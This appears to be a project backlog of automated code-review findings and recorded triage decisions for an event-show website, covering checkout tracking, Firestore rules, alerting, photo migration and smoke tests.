Both findings critique the "Mobile Sticky CTA" writeup in ENHANCEMENTS.md, which was authored on the unmerged `feat/event-pages-tracked-checkout` branch and describes that branch's code. Evaluate when that branch's PR is reviewed.

- [ ] HIGH: [SCOPE-CREEP] `ENHANCEMENTS.md` sticky CTA entry broadens an event-page CTA request into a sitewide contract covering tickets and city pages without that universal scope appearing in the stated intent.
- [ ] HIGH: [UNSOURCED-CLAIM] `ENHANCEMENTS.md` sticky CTA entry makes current-code, traffic and existing-task claims without `file:line` evidence or command output.

### Codex (2026-08-03T07:15Z)

Applies to the unmerged `feat/event-pages-tracked-checkout` branch; fix there.

- [ ] HIGH: [UNRESOLVED-BACKLOG] The no-`eid` `InitiateCheckout` finding was pruned as resolved, but `f916f02` does not fully resolve it. `ticketCtaTracking.ts:42-58` adds `eid` client-side while the rendered link remains `/api/go/...`; `api/go/[slug].ts:58-60,93` still generates a fallback ID and fires CAPI for any unrecognized user agent. Browser prefetches using a normal browser user agent can therefore still be counted as conversions.

### Codex (2026-08-12T16:29Z)

This review ran on the merge of main into `fix/eventbrite-widget-silent-failure` (PR #159), so its diff was dominated by content already merged to main via other PRs; every finding below targets that main-side content, none of it authored on the PR branch. The SCOPE-CREEP and UNSOURCED-CLAIM findings on the ENHANCEMENTS.md sticky CTA entry are duplicates of the Codex 2026-08-03T06:53Z entries above and are not re-listed.

- [ ] HIGH: [FALSE-SUCCESS] `test/followups.test.ts:291-334` omits missing-recipient and delivery-failure cases. `src/pages/api/cron/followups.ts:256-277` records the briefing date and reports `briefingSent: true` even when no host email is configured or every send fails, preventing retries.
- [ ] HIGH: [SWALLOWED-ERROR] `test/post-show.test.ts:178-187` normalizes an SMTP failure without requiring any observable error. `src/pages/api/cron/post-show.ts:61-62` silently suppresses the failure and returns success.
- [ ] MEDIUM: [BOUNDARY-COVERAGE] `test/post-show.test.ts:144-166` uses days 1 and 11 but never tests the inclusive D3 and D10 boundaries claimed in the CHANGELOG entry for the contestant-workflow test coverage, leaving the relevant off-by-one mutations uncovered.
- CRITICAL `FABRICATED-REFERENCE` on the `e520120` commit body (test and check results stated without logs stored in the repo): won't fix, kept here so the same report is not re-filed. Two grounds. First, `e520120` is already published on main, merged via PR #158; it entered this review's diff only through the merge of main into the PR branch, and rewriting a published main commit message would require force-pushing main, which is prohibited without exception. Second, this repo intentionally stores no test logs as committed artifacts. The required "Lint, Types, Test, Build" check (`.github/workflows/ci.yml`) runs on pull requests targeting `main` and runs lint, `astro check`, the full vitest suite, the build and `npm audit`; it runs neither Stryker nor the scoped test command, so the commit body's specific historical counts (scoped 53/53, Stryker 0 to 8%) are not re-verified anywhere and stand only as that commit's contemporaneous report. What CI does guarantee is that the code currently on the branch passes the full suite before merge, which is the property the repo actually relies on.

### Flaky CI (2026-08-26)

- [ ] HIGH: Weekly Smoke Tests workflow on main has failed 6 consecutive scheduled runs (Jul 22 through Aug 26 2026, latest run 32962540856), every failure on the iphone Playwright project: apply form success panel never appears, HomeSignup and both waiver flows fail, every city page test fails | Why: a permanently red scheduled job means real mobile regressions land unseen, and 70% of traffic is mobile; part of this may be the already queued waiver apply-terms selector rot but apply/city/signup failures are broader than that entry | Files: tests/smoke/critical-flows.spec.ts, tests/smoke/site.spec.ts, playwright.config.ts | Plan: run the iphone project locally against a build to classify each failure as selector rot, mobile overlay intercepting taps or a real regression; fix test-side rot directly, split any real mobile UI regression into its own entry with the owning component files | Verify: smoke workflow green on main for the iphone project on the next scheduled run plus 3 consecutive green local runs of both spec files under the iphone project
- [ ] MEDIUM: Rules emulator test "step-2 phone update may touch ONLY the phone field" flakes with "Null value error" at firestore.rules L172 (validPhoneUpdate) | Why: PR #219 run 32936947905 failed it while the identical rules and test passed CI 40 minutes earlier on the same branch (74f0b96); a flaky security-rules gate trains everyone to rerun-and-ignore, which is how a real rules regression slips through | Files: test/rules/public-write.rules-test.ts, firestore.rules | Plan: reproduce by looping the leads describe block against the emulator; suspect the update test reuses a doc created by a prior test or the create-then-update pair races doc visibility, making resource.data null inside d.diff(prev); fix by giving the test its own freshly awaited doc (or asserting the create completed) rather than weakening the rule | Verify: 20 consecutive vitest.rules runs of the file green locally and the CI job green on the next push

### CodeRabbit PR #135 review — 2026-08-12 (deferred, heavy lifts; quick wins fixed same day)

- [ ] MEDIUM: `isSynthetic` remains in the public Firestore write schema, so an anonymous client can mark its own application synthetic and hide it from the dashboard. The notification-suppression half was closed same day (server derives synthetic from the verified email in `/api/notify-application`); removing the field from the public schema needs a trusted server-side write path for the monitor and matching rules-test updates.
- [ ] MEDIUM: photo previews in the apply form read every accepted file through `FileReader.readAsDataURL()` before compression; a multi-photo selection of large originals can hold hundreds of MB of base64 in memory on mobile. Switch previews to `URL.createObjectURL` with revocation. at src/components/apply/useApplyForm.ts:262
- [ ] MEDIUM: `contestant-claim`, `contestant-open-claim` and `contestant-show-claim` group several non-idempotent Firestore writes in one try block and return a retryable 500; a retry after a partial failure creates duplicate contestant records and waiver submissions. Needs idempotency keys or preflighting the fallible config (portal token signing) before the first write.
- [ ] LOW: `.github/workflows/synthetic-apply.yml` runs verification/cleanup only when Playwright succeeds; a submission written before a later assertion failure is left behind and can trip the 48-hour cleanup guard. Run cleanup unconditionally (`if: always()`).

### Codex (2026-08-12T17:53Z)

- [ ] HIGH: [FALSE-PAGER-SUCCESS] `src/lib/opsAlert.ts:81` swallows every delivery failure with `Promise.allSettled`, and `src/pages/api/alert-failure.ts:77` always returns 200. The workflow heartbeat and failure notification can therefore report success when neither email nor webhook delivered. Executor: the 3:00 overnight fixer (product repos are in its lane per the 2026-08-19 cadence decision); the independent GitHub-issue pager covers the owner meanwhile, but real applicants' failure emails still ride this swallowing path.
- [ ] MEDIUM: `.github/workflows/synthetic-apply.yml:49` runs verification and cleanup only after Playwright succeeds. A submission that reaches Firestore before a later browser assertion fails is left behind. Once older than 48 hours, it can make the cleanup script refuse subsequent cleanup runs.
- [ ] MEDIUM: `src/data/waiverPage.ts:22` promises that a receipt was emailed, but `src/pages/api/stage-waiver.ts:131` intentionally returns success after receipt delivery fails. Users can receive a false confirmation.

### Codex (2026-08-12T18:28Z)

- [ ] HIGH: [BROKEN-SMOKE-SELECTOR] `tests/smoke/critical-flows.spec.ts:204` selects `apply-terms` on `/waiver`, but `StandaloneWaiverForm.tsx:205` has no such attribute. The waiver smoke flow now fails before submission.

### Codex (2026-08-12T18:28Z)

- [ ] MEDIUM: [FALSE-POSITIVE-RULE-TEST] The non-image test at `test/rules/apply-flow.rules-test.ts:87` omits required owner metadata. It now fails regardless of the content-type rule, so removing the image restriction would not make this regression test fail.

## Critical (round cap reached, push allowed, fix before merge)

### Codex (2026-08-12T16:37Z)

- CRITICAL: [FABRICATED-REFERENCE] Re-filed against the `e520120` commit body (1157/1157 full-suite tests, 53/53 scoped tests, zero check errors, 0 to 8% Stryker result, all stated without stored evidence): same won't-fix decision as the entry above, kept so the report is not re-filed a third time. The commit is published main history and the repo stores no test logs; the won't-fix rationale above now states the CI scope accurately (PRs targeting `main`; no Stryker, no scoped command, historical counts not re-verified). This entry is a recorded decision, not an open action item.

### Codex (2026-08-12T19:41Z)

- [ ] HIGH: [RECOVERY-ORDERING] `src/lib/eventbriteRecovery.ts:135-138` checks `event.defaultPrevented` before later listeners or ancestor listeners execute. If a partially initialized Eventbrite handler prevents default during bubbling, this fallback has already returned and the checkout CTA remains dead. `src/lib/eventbriteRecovery.test.ts:214-234` only tests a suppressing listener registered earlier on the same element.
- [ ] HIGH: [SCOPE-CREEP] `LESSONS.md:9` turns Eventbrite-specific timing and DOM behavior into constraints for “Any integration,” while `src/lib/navigation.ts:7-9` mandates the wrapper for all navigation. Neither universal rule is part of the stated Eventbrite recovery scope and the latter already conflicts with direct navigation at `src/layouts/BaseLayout.astro:347`.
- [ ] MEDIUM: [UNASKED-CHANGE] `ENHANCEMENTS.md:7-12` adds a separate script-load failure backlog item that explicitly identifies itself as outside PR #159’s review findings and does not trace to the stated commit intent.

The 2026-08-12T19:47Z re-review of the amended push re-filed the same three findings verbatim; they are recorded once above, not duplicated.

### Codex (2026-08-12T20:05Z)

This review ran on the merge of main into `fix/eventbrite-widget-silent-failure` (PR #159) after PR #135 landed on main, so its diff was dominated by PR #135's apply-outage content; every finding in this section targets that main-side content, none of it authored on the PR branch. Several overlap the 17:53Z and 18:28Z entries above with added detail.

- CRITICAL `UNSAFE-ROLLOUT` (`useApplyForm.ts:507` writes `photoPaths` while the deployed Firestore allowlist may still exclude it): not fixable on this branch and not created by it. The flagged client code is already published on main via PR #135 and Vercel ships it from main regardless of whether PR #159 merges. The rollout sequencing risk is exactly the "pending rules deploy via Firebase CLI" condition already tracked by the CRITICAL apply-outage entry at the top of this file, plus PR #135's operator steps. Recorded here so the same report is not re-filed against PR #159's merge commits.

### Codex (2026-08-14, PR #157 merge push)

This review ran on the merge of main into `fix/speed-insights-node-env` (PR #157), so its diff was again dominated by main-side content from PRs #135, #158 and #159; nothing it flags was authored on the PR branch, whose own change is a 4 line `astro.config.mjs` deletion plus doc conflict resolution. Both CRITICALs are re-filings of decisions already recorded in this file.

- CRITICAL `UNSAFE-ROLLOUT` re-filed against PR #157's merge commit: same recorded decision as the Codex 2026-08-12T20:05Z entry above, on identical grounds (client code published on main via PR #135, sequencing tracked by the apply-outage entry at the top of this file plus PR #135's operator steps). Kept so the report is not re-filed against further merge commits of main into open branches.
- CRITICAL `FABRICATED-REFERENCE` re-filed against the `38cb5df`, `4ec96f3` and `e520120` commit bodies (exact lint and test counts stated without committed logs): same won't-fix decision as the two entries in the round-cap section below. `4ec96f3` and `e520120` are published main history and cannot be reworded without a prohibited force push. `38cb5df`'s Verified line follows the format the repo's own commit-msg hook mandates and rejects commits without (its own examples state exact counts such as "npm test -> 47/47 pass"); the counts were produced by the pre-commit gate that ran on that very commit, and the repo intentionally stores no test logs as artifacts. CI re-runs the full suite on every PR, which is the guarantee the repo relies on.

- [ ] HIGH: [FALSE-PAGER-SUCCESS] `src/lib/opsAlert.ts:72` does not reject non-success webhook responses, `src/lib/opsAlert.ts:92` swallows every channel failure and `src/pages/api/alert-failure.ts:77` always returns 200. The heartbeat and failure notification curls at `.github/workflows/synthetic-apply.yml:72` and `:86` can therefore pass when no alert was delivered.
      [PUSH-GUARD-BYPASS] `.husky/pre-push:4` checks the checked-out branch instead of the refs received on stdin. From a feature branch, pushes such as `git push origin HEAD:main` bypass the main protection.
      [BROKEN-SMOKE-SELECTOR] `tests/smoke/critical-flows.spec.ts:204` checks `apply-terms` on `/waiver`, but the waiver checkbox at `src/components/waiver/StandaloneWaiverForm.tsx:205` has no such attribute. Both waiver smoke flows fail before submission.
      [NON-IDEMPOTENT-WRITES] The claim routes write a contestant before token signing or invite updates at `src/pages/api/contestant-claim.ts:110`, `contestant-open-claim.ts:98` and `contestant-show-claim.ts:117`. `stage-waiver.ts:97` similarly writes the waiver before linkage writes. Later failure returns a retryable 500, so retries create duplicate legal records.
      [MOBILE-OOM] `useApplyForm.ts:253` accepts ten files approaching 50 MB each, then `useApplyForm.ts:275` converts every original to a base64 data URL before compression. Large iPhone selections can allocate hundreds of megabytes and kill the tab.
      [UNTRUSTED-MIGRATION-INPUT] `firestore.rules:100` permits unvalidated public `photoUrls`, while `scripts/migrate-legacy-photo-urls.mjs:67` accepts any URL containing `/o/photos...` without validating host or bucket. A crafted application can make the privileged migration revoke a known unrelated photo token.
      [SCOPE-CREEP] `LESSONS.md:247` turns one JotForm failure into a universal ban on third-party payments. That was not part of the stated waiver change and conflicts with the existing Eventbrite payment architecture documented at `src/data/legal.ts:73`.
      [UNASKED-CHANGE] The apply-outage commit also changes repository-wide hook architecture through `.husky/pre-commit`, `.husky/pre-push`, `.gitignore:70` and `package.json:28`. This developer-workflow refactor does not trace to the stated apply, waiver, alerting or dependency intent.

### Codex (2026-08-12T20:05Z)

- [ ] MEDIUM: [NONATOMIC-MIGRATION] Despite the WHY comment, `scripts/migrate-legacy-photo-urls.mjs:197` revokes tokens before writing `photoPaths`. A patch failure leaves documents pointing only to dead URLs until an operator reruns the script.
      [PHOTO-PATH-MISMATCH] `useApplyForm.ts:449` copies an arbitrary filename suffix into the Storage path, while `firestore.rules:42` permits only ASCII path characters. Valid image files with spaces or Unicode in the suffix upload successfully and then fail the application write.
      [FALSE-RECEIPT-CONFIRMATION] `src/data/waiverPage.ts:22` promises that a receipt was emailed, but `src/pages/api/stage-waiver.ts:134` suppresses delivery failures and still returns success.
      [FALSE-POSITIVE-RULE-TEST] The non-image regression at `test/rules/apply-flow.rules-test.ts:87` omits required owner metadata. It fails even if the content-type restriction is removed.
      [STALE-SYNTHETIC-DATA] Cleanup at `.github/workflows/synthetic-apply.yml:51` runs only after Playwright succeeds. A document written before a later browser assertion fails is left behind and can eventually exceed the cleanup script’s 48-hour safety window.
      [PUBLIC-SYNTHETIC-FLAG] `firestore.rules:102` lets anonymous writers set `isSynthetic`, while `AdminDashboard.tsx:211` hides every marked application. The monitor marker needs a trusted write path rather than a public boolean.
      [CONTRADICTORY-INCIDENT-RECORD] `LESSONS.md:227` says every July application failed because admin-only rules were live. `LESSONS.md:251` and `BUGS.md:11` correctly state those rules were never deployed and only large-photo submissions failed.
      [SILENT-PHOTO-FAILURE] `useApplicantPhotos.ts:81` converts download errors to `null` and `:87` removes them without exposing an error count. The dashboard renders a no-photo placeholder indistinguishable from an applicant who uploaded nothing.
      [SVG-CONTRACT-MISMATCH] `useApplyForm.ts:241` accepts every `image/*`, but `storage.rules:40` rejects SVG. Small SVG files bypass compression and produce an avoidable submission failure.

### Codex (2026-08-12T20:16Z)

- [ ] HIGH: [FALSE-PAGER-SUCCESS] `src/lib/opsAlert.ts:72-102` neither rejects unsuccessful webhook responses nor propagates channel failures. `src/pages/api/alert-failure.ts:75-79` consequently returns 200 when every channel failed. The workflow curls at `.github/workflows/synthetic-apply.yml:72` and `:86` also omit HTTP failure handling, so both the heartbeat and outage page can report success without delivering anything.
      [INCOMPLETE-PII-MIGRATION] `scripts/migrate-legacy-photo-urls.mjs:74-89` only queries `photoUrls`. Legacy `photoUrl` documents explicitly supported at `src/types/application.ts:42` and `src/utils/applicantPhotos.ts:24` are never migrated or revoked. Documents already containing `photoPaths` also retain `photoUrls` because the patch is skipped at `scripts/migrate-legacy-photo-urls.mjs:205`.
      [PUSH-GUARD-BYPASS] `.husky/pre-push:4-8` checks the checked-out branch instead of the refs received on stdin. From a feature branch, `git push origin HEAD:main`, `git push origin main` and deletion of remote main all bypass the guard.
      [BROKEN-SMOKE-SELECTOR] `tests/smoke/critical-flows.spec.ts:204` selects `apply-terms` on `/waiver`, but the checkbox at `src/components/waiver/StandaloneWaiverForm.tsx:205-213` has no such attribute. Both new waiver smoke tests fail before submission.
      [MOBILE-OOM] `src/components/apply/useApplyForm.ts:253-289` accepts ten files approaching 50 MB each and converts every original to a base64 data URL before compression. This can allocate hundreds of megabytes and terminate the mobile tab.
      [NON-IDEMPOTENT-WRITES] The claim routes write contestant records before token signing or linkage at `src/pages/api/contestant-claim.ts:110-122`, `contestant-open-claim.ts:98-104` and `contestant-show-claim.ts:117-118`. `stage-waiver.ts:97-109` similarly writes the waiver first. Later failures return retryable 500 responses, so retries create duplicate legal records.
      [SCOPE-CREEP] `LESSONS.md:247` expands one JotForm failure into a universal ban on third-party payments, despite the existing Eventbrite payment architecture documented at `src/data/legal.ts:73`.
      [UNASKED-CHANGE] The apply-outage change also rewrites repository-wide hook architecture through `.husky/pre-commit`, `.husky/pre-push`, `.gitignore:70-77` and `package.json:28`. This does not trace to the stated apply, waiver, alerting or dependency intent.

### Codex (2026-08-12T20:16Z)

- [ ] MEDIUM: [PUBLIC-SYNTHETIC-FLAG] `firestore.rules:102` allows anonymous writers to set `isSynthetic`, while `src/components/admin/AdminDashboard.tsx:211-213` and `:252-254` hide every marked application.
      [PHOTO-CONTRACT-MISMATCH] `useApplyForm.ts:239-242` accepts SVG, but small files bypass compression at `compressImage.ts:20` and are rejected by `storage.rules:40`. Arbitrary filename suffixes are also copied at `useApplyForm.ts:449`, while `firestore.rules:42` rejects spaces and Unicode.
      [FALSE-RECEIPT-CONFIRMATION] `src/data/waiverPage.ts:22` promises an emailed receipt, but `src/pages/api/stage-waiver.ts:134-145` suppresses receipt failures and still returns success.
      [STALE-SYNTHETIC-DATA] Verification and cleanup at `.github/workflows/synthetic-apply.yml:51-52` run only after Playwright succeeds. A submission written before a later assertion fails remains and eventually triggers the permanent 48-hour cleanup refusal at `scripts/synthetic-apply-verify.mjs:163-168`.
      [FALSE-POSITIVE-RULE-TEST] The non-image test at `test/rules/apply-flow.rules-test.ts:87-93` omits required owner metadata, so it still fails if the content-type restriction is accidentally removed.
      [RULE-TEST-ISOLATION] Both rules suites use project `demo-garam-masala` and clear its Firestore state in `beforeEach`, while `vitest.rules.config.ts:14-19` leaves file parallelism enabled. Parallel files can erase each other’s fixtures.
      [SILENT-PHOTO-FAILURE] `src/components/admin/useApplicantPhotos.ts:77-88` converts every download failure to `null`. The modal then renders the same no-photo placeholder at `ApplicantModal.tsx:287-296`, with no failed count or error state.
      [CONTRADICTORY-INCIDENT-RECORD] `LESSONS.md:227` still says every July submission failed under deployed admin-only rules. `BUGS.md:7-11` correctly records that those rules were never deployed and only large-photo applications failed.

### Codex (2026-08-12T20:19Z)

- [ ] MEDIUM: Consolidate duplicate findings. (BUGS.md:761-772)
- [ ] MEDIUM: Consolidate the repeated findings. (BUGS.md:774-783)

### Codex (2026-08-13T19:14Z): both findings describe the pre-merge transition window, resolved when claude-global-config PR #18 merges (kept so they are not re-filed)

- HIGH: [ORPHANED-QUEUE] True only until PR #18 merges: the LIVE retry tooling (the reviewer's vantage) still reads legacy ENHANCEMENTS.md, while PR #18's code reads reviews/retry-queue.md first with a legacy transition leg and a nightly migrator sweep, and excludes .worktrees so stale tracked copies in old session worktrees stop being counted. The 57 moved rows wait out the window exactly as pre-migration entries waited before.
- HIGH: [HOOK-GUARD-NOT-IMPLEMENTED] The guard exists on PR #18 (bash-guardrails denies commit/push into any repo with a local core.hooksPath, self-test fixtures included); it is not yet in the LIVE hook the reviewer read. Until merge, the unset already applied to this repo is the protection.

### Codex (2026-08-14T16:21Z)

- [ ] HIGH: [FALSE-PAGER-SUCCESS] `src/lib/opsAlert.ts:72-102` neither rejects unsuccessful webhook responses nor propagates delivery failures. `src/pages/api/alert-failure.ts:75-79` always returns 200, while both workflow curls omit HTTP failure handling. The heartbeat and outage pager can pass without delivering an alert.
      [PUSH-GUARD-BYPASS] `.husky/pre-push:4-8` checks the checked-out branch instead of the refs supplied on stdin. A feature branch can still push or delete remote `main`.
      [BROKEN-SMOKE-SELECTOR] `tests/smoke/critical-flows.spec.ts:204` selects `apply-terms` on `/waiver`, but `StandaloneWaiverForm.tsx:205-213` has no such attribute. Both new waiver smoke flows fail before submission.
      [FALSE-BRIEFING-SUCCESS] `src/pages/api/cron/followups.ts:271-293` records the briefing date and reports `briefingSent: true` when no recipient is configured or every delivery fails, preventing a retry.
      [NON-IDEMPOTENT-WRITES] The claim routes and `stage-waiver.ts` persist legal records before later token or linkage operations. A subsequent retryable 500 can produce duplicate contestants or waivers.
      [MOBILE-OOM] `useApplyForm.ts:253-289` accepts ten files approaching 50 MB each, then converts every original to a base64 data URL before compression. This can exhaust memory on the mobile browsers the change targets.
      [UNTRUSTED-MIGRATION-INPUT] `firestore.rules:100` permits unvalidated public `photoUrls`, while `migrate-legacy-photo-urls.mjs:67-71` accepts any host containing a matching `/o/photos...` path. A crafted application can make the privileged migration revoke an unrelated photo token.
      [INCOMPLETE-PII-MIGRATION] The migration queries only `photoUrls`, missing supported legacy `photoUrl` records. It also retains `photoUrls` when `photoPaths` already exists, leaving tokened PII URLs stored.
      [RECOVERY-ORDERING] `eventbriteRecovery.ts:135-138` checks `defaultPrevented` before later or ancestor listeners run. If one of those listeners suppresses navigation, the fallback has already returned and the CTA remains dead.
      [SCOPE-CREEP] `LESSONS.md` expands isolated Eventbrite and JotForm failures into universal rules for every integration and all third-party payments, beyond the stated changes and in conflict with the existing Eventbrite checkout architecture.
      [UNASKED-CHANGE] The apply-outage commit also rewrites repository-wide hook architecture through `.husky`, `.gitignore` and `package.json`, which is not named by the stated apply, waiver, alerting or dependency intent.

### Codex (2026-08-14T16:21Z)

- [ ] MEDIUM: [PUBLIC-SYNTHETIC-FLAG] `firestore.rules:102` lets anonymous writers set `isSynthetic`, while `AdminDashboard.tsx:211-213` and `:252-254` hide every marked application.
      [PHOTO-CONTRACT-MISMATCH] The client accepts SVG but Storage rejects it. It also copies arbitrary filename suffixes into paths that Firestore restricts to ASCII, allowing an upload to succeed before the application write fails.
      [FALSE-RECEIPT-CONFIRMATION] `waiverPage.ts:22` promises an emailed receipt, but `stage-waiver.ts:134-145` suppresses delivery failures and still returns success.
      [STALE-SYNTHETIC-DATA] Verification and cleanup run only after Playwright succeeds. A document written before a later assertion failure remains and can eventually trigger the cleanup script’s permanent 48-hour refusal.
      [FALSE-POSITIVE-RULE-TEST] The non-image test at `apply-flow.rules-test.ts:87-93` omits required owner metadata, so it still fails if the content-type restriction is removed.
      [RULE-TEST-ISOLATION] Both rules suites share project `demo-garam-masala` and clear its state in `beforeEach`, while file parallelism remains enabled. Parallel suites can erase each other’s fixtures.
      [SILENT-PHOTO-FAILURE] `useApplicantPhotos.ts` converts download failures to missing photos, leaving the admin UI unable to distinguish access or network failures from applicants who uploaded nothing.
      [CONTRADICTORY-INCIDENT-RECORD] `LESSONS.md` says every July application failed under admin-only rules, while `BUGS.md:5-11` correctly says those rules were not deployed and only large-photo submissions failed.

### Codex (2026-08-14T16:44Z)

- [ ] MEDIUM: Remove the repeated findings before merge. (BUGS.md:801-827)

### Codex (2026-08-14T17:40Z)

- HIGH: [SCOPE-CREEP] LESSONS.md:9 broadens the show-specific retention rule to every `src/data/` record. src/data/CLAUDE.md:5 and EVENTS-HISTORY.md:29 also permanently retain unused venue constants, while src/data/events.ts:390 freezes the current TBA roster as “always.” The stated intent only retains shows and sets the current roster.
  Decision (2026-08-14): resolved by design. The reviewer did not have the owner's mid-session instructions: venue constants were EXPLICITLY ordered permanent ("even stuff like this venue constant should say, all the log should stay even if it then ends up referencing nothing") and the standing LA/SF/NY notify roster is verbatim her ask ("add LA SF and new york should always be on notify me"). The LESSONS rule scoping to destructive-sounding requests against src/data content is the lesson she taught twice.

### Codex (2026-08-14T17:40Z)

- [ ] MEDIUM: [TBA-SUPPRESSION] src/data/events.ts:454-457 does not use `isDisplayable()`, so a hidden future show suppresses its city’s public TBA card despite the function’s contract. Hidden entries supplied through `tbaList` are also appended.
      [SHARED-GATE-BYPASS] The four changed API lookups manually duplicate `hidden` and `status` checks instead of using `isDisplayable()`, contradicting the commit’s centralization claim and allowing future display-state changes to drift.
      [CONTRADICTORY-PERMANENCE-RECORD] EVENTS-HISTORY.md:18-21 lists six removed shows that remain absent from events.ts, while LESSONS.md:5 and src/data/CLAUDE.md:5 claim every scheduled show stays there forever. Document the legacy exception or restore those records.
      [UNASKED-CHANGE] ENHANCEMENTS.md:1603-1610 and ENHANCEMENTS.md:1625-1626 modify unrelated historical review metadata with no trace to either stated commit intent.
      Decision on UNASKED-CHANGE (2026-08-14): resolved by design. Those telemetry lines are appended by the review hooks themselves (same pattern as commits 38cb5df and 1f56dea) and were already in the working tree at session start; committing them alongside is the established convention. TBA-SUPPRESSION, SHARED-GATE-BYPASS and CONTRADICTORY-PERMANENCE-RECORD remain open for a follow-up pass.

### Codex (2026-08-14T18:12Z)

- [ ] MEDIUM: [MISSING-CHANGELOG] The production analytics fix is absent from `CHANGELOG.md`, despite the repository requiring meaningful changes to be recorded.

### Codex (2026-08-14T19:09Z) on the event-pages-tracked-checkout ship push

Fixed in-session the same day (entries removed per doc routing): CHECKOUT-RATE-LIMIT and STALE-PAST-CTA (go route now resolves the event first, sends canceled/past shows to /tickets, and a tripped rate limit only suppresses CAPI, never the redirect; covered by test/go-redirect.test.ts), BUILD-HANG (10s AbortSignal.timeout on the build-time Eventbrite content fetch), ANALYTICS-SEMANTICS (data-event-vendor standardized to vendorFromUrl across all seven CTA sites), MERGE-DEBRIS (formatter-escaped conflict markers removed from CHANGELOG.md) and the FABRICATED-REFERENCE critical (obsolete widget-loader entry deleted from ENHANCEMENTS.md). Remaining items below.

- [ ] MEDIUM [MISSING-COVERAGE, remainder] The new redirect route now has test/go-redirect.test.ts, but the CAPI client (`src/lib/capi.ts`), bot detection (`src/lib/isBotUserAgent.ts`), ticket CTA wiring (`src/lib/ticketCtaTracking.ts`), withTimeout behavior and the sync-orders Purchase retry state machine remain untested. Executor: the 3:00 overnight fix-medium-bugs lane.
- Decision (2026-08-14): [EVENT-ID-REUSE] in `src/lib/ticketCtaTracking.ts` is won't-fix, by design. The per-anchor event_id carries an explicit WHY comment: repeated clicks on one rendered anchor are a single checkout intent, and Meta deduping the browser Pixel, the server CAPI call and any repeat click into one InitiateCheckout is the wanted behavior. Regenerating per click would double-count intent and desynchronize the ?eid= already stamped on the href. Logged so the finding is not re-filed.

### Codex (2026-08-15T02:23Z)

- [ ] HIGH: [UTC-CALENDAR-CUTOFF] `src/utils/eventDate.ts:107` compares dates against UTC. At 5 PM PDT, a West Coast show is considered past, so `src/pages/api/go/[slug].ts:61` redirects buyers to `/tickets` before an evening show begins. Compare against the event’s timezone and end time. (Pre-existing PR #196 code, surfaced by the 2026-08-15 review of the merge range on the dependency branch.) Executor: the 3:00 overnight fix-medium-bugs lane (or the next session in this repo if it runs first).
- Note (2026-08-15): the UNBOUNDED-SYNC-RUNTIME finding from this round duplicates the entry above dated 2026-08-14; that entry already carries the executor.

### Codex (2026-08-15T02:23Z)

- [ ] MEDIUM: [CONTENT-ARCHITECTURE] User-facing copy is hardcoded throughout `src/components/events/EventTicketCta.astro:61` and `src/pages/events/[slug].astro:195`, contrary to the repository rule that copy belongs in `src/data/`. Move these strings into `src/data/copy.ts`. (Pre-existing PR #196 code.) Executor: the 3:00 overnight fix-medium-bugs lane.
- [ ] MEDIUM: [MISSING-COVERAGE] The new CAPI client, terminal retry behavior, bot detection and ticket tracking module have no direct tests. The redirect test also omits the same-day timezone boundary that exposes the checkout cutoff. (Pre-existing PR #196 gap; largely duplicates the MISSING-COVERAGE remainder entry above, which already carries the executor.) Executor: the 3:00 overnight fix-medium-bugs lane.

### Outage-recovery review 2026-08-17 (recovered Codex pass over the PR #196 merge range; RETRY file processed and deleted 2026-08-18)

Already handled elsewhere: the UTC date cutoff, UNBOUNDED-SYNC-RUNTIME, PERMANENT-RETRY-STARVATION and coverage findings duplicate the queued entries above; MERGE-DEBRIS was fixed in commit c04c44c before PR #195 merged; the chicago-tba stale comment example moved to ENHANCEMENTS.md as a LOW. New items, all pre-existing PR #196 code:

- [ ] HIGH: [UNTRACKED-CTA] Event-specific Get Tickets links on the links page go straight to the vendor | Why: `src/pages/links.astro` renders `href={ticketUrl}` directly, bypassing `/api/go/[slug]`, so those clicks fire no server CAPI InitiateCheckout and skip browser/server dedup, undercounting the exact conversions the PR #196 migration was built to capture | Files: src/pages/links.astro, src/lib/ticketCtaTracking.ts | Plan: route the links-page event CTAs through `/api/go/[slug]` with the same `?eid=` stamping the other seven CTA sites use | Verify: click a links-page event CTA locally and confirm the /api/go redirect plus one deduped InitiateCheckout event id. Executor: the 3:00 overnight fix-medium-bugs lane.
- [ ] HIGH: [CHECKOUT-DELAY] `/api/go/[slug]` awaits Meta CAPI for up to 2 seconds before redirecting | Why: `CAPI_TIMEOUT_MS = 2000` is awaited before the 302 (the WHY comment is right that fire-and-forget dies on Vercel, but a slow Meta response still stalls the buyer up to 2s, recreating the stall the redirect migration removed) | Files: src/pages/api/go/[slug].ts, package.json | Plan: use `waitUntil` from `@vercel/functions` so the CAPI call runs after the response is sent, keeping delivery guaranteed without blocking the redirect; keep the awaited path as fallback where waitUntil is unavailable | Verify: redirect returns immediately with CAPI mocked to a 2s delay, existing go-redirect tests stay green. Executor: the 3:00 overnight fix-medium-bugs lane.
- [ ] MEDIUM: [STALE-STATIC-CTA] `EventTicketCta.astro` freezes past/upcoming state at build time | Why: the label and link state are computed during the static build, so once an event date passes without a redeploy the page still shows Get Tickets even though the server route now redirects past shows to /tickets (server half fixed 2026-08-14; this is the client half) | Files: src/components/events/EventTicketCta.astro | Plan: add a small inline date check on the client (or an ISR/rebuild trigger) that swaps the CTA to the past-show state when `isoDate` has passed | Verify: load a built event page with a mocked past date and confirm the CTA shows the past-show state. Executor: the 3:00 overnight fix-medium-bugs lane.
- [ ] MEDIUM: [DATA-MIGRATION-MISSING] The Purchase-CAPI retry query only matches orders where both new booleans are explicitly false | Why: order documents created before PR #196 have neither `purchaseCapiSent` field, Firestore equality filters skip documents missing the field, so pre-existing undelivered orders can never be retried without a backfill | Files: src/pages/api/sync-orders.ts | Plan: one-time backfill with a cutover rule, not a blanket one. Orders created before server-side Purchase CAPI went live (PR #196's deploy) may already have been counted by the old browser-side pixel Purchase, which had no CAPI dedup id, so re-sending them can double-count revenue: mark those pre-cutover documents `purchaseCapiSent: true` with a `migrationNote` field so they leave the retry set permanently. Only documents created after the cutover get backfilled to false for retry. A not-equal-true query is NOT a substitute for either half: Firestore inequality filters also exclude documents where the field is absent, so only an explicit backfill reaches fieldless documents | Verify: emulator test confirms a fieldless pre-cutover order is marked sent and stays out of the retry set while a fieldless post-cutover order enters it. Executor: the 3:00 overnight fix-medium-bugs lane.
